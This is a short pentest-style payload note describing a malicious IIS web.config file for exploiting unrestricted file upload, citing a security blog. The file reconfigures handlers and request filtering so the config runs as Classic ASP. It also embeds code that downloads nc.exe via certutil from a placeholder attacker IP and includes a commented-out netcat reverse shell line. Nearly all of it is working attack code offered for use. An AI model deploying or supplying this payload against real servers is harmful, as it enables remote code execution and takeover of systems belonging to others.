web.config

reference: https://soroush.secproject.com/blog/tag/unrestricted-file-upload/#section2

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />        
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>

<%

' Classic ASP Code 

set objshell=server.createobject("WScript.Shell")

' downloading file 
objshell.run "cmd.exe /c certutil -urlcache -split -f ""http://<attacker ip>:<attacker port>/nc.exe"" C:\\Windows\\Temp\\nc.exe",1,true
' reverse shell
'objshell.run "cmd.exe /c C:\\Windows\\Temp\\nc.exe -e cmd.exe <attacker ip> <attacker port>",1,true

' check if code executed successfully
Response.write("test")

%>
```